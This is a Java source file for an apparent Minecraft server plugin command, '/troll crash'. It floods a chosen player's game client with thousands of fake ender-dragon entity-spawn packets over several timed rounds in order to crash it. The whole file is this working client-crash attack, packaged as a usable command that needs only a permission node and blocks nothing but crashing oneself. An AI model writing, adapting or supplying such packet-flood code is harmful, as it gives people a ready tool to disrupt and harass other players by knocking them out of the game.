package com.mcdragonmasters.potatoessentials.commands;

import com.mcdragonmasters.potatoessentials.PotatoEssentials;
import com.mcdragonmasters.potatoessentials.utils.PotatoCommand;
import dev.jorel.commandapi.CommandAPICommand;
import dev.jorel.commandapi.arguments.EntitySelectorArgument.OnePlayer;
import dev.jorel.commandapi.executors.CommandArguments;
import net.minecraft.network.protocol.game.ClientboundAddEntityPacket;
import net.minecraft.world.entity.EntityType;
import net.minecraft.world.phys.Vec3;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.UUID;
import java.util.concurrent.ThreadLocalRandom;

public class TrollCommand extends PotatoCommand {
    public TrollCommand() {
        super("troll");
        setPermission(NAMESPACE+".troll");
    }

    private final OnePlayer crashArg = new OnePlayer("target");

    @Override
    public void register() {
        new CommandAPICommand(name)
                .withPermission(permission)
                .withSubcommand(
                        new CommandAPICommand("crash")
                                .withPermission(permission+".crash")
                                .withArguments(crashArg)
                                .executes(this::crash)
                )
                .register();
    }
    private void crash(CommandSender sender, CommandArguments args) {
        Player toBeCrashed = args.getByArgument(crashArg);
        if (toBeCrashed==null) return;
        if (sender instanceof Player senderP && toBeCrashed.equals(senderP)) {
            sender.sendRichMessage("<red>You cannot crash yourself!");
            return;
        }

        sender.sendRichMessage("<gray>Crashing <yellow>"+toBeCrashed.getName());

        var connection = ((CraftPlayer) toBeCrashed).getHandle().connection;
        double x = toBeCrashed.getX();
        double y = toBeCrashed.getY();
        double z = toBeCrashed.getZ();
        var type = EntityType.ENDER_DRAGON;
        Vec3 vec3 = new Vec3(0,0,0);
        new BukkitRunnable() {
            private int iter = 0;
            @Override
            public void run() {
                if (!toBeCrashed.isOnline()) cancel();
                if (iter>15) cancel();
                for (int i = 0; i < 5000; i++) {
                    int id = ThreadLocalRandom.current().nextInt(1, 99999);
                    var packet = new ClientboundAddEntityPacket(
                            id, UUID.randomUUID(), x, y, z,
                            0,0 , type, 0, vec3, 0);
                    connection.sendPacket(packet);
                }
                iter++;
            }
        }.runTaskTimer(PotatoEssentials.INSTANCE, 20, 40);
    }
}
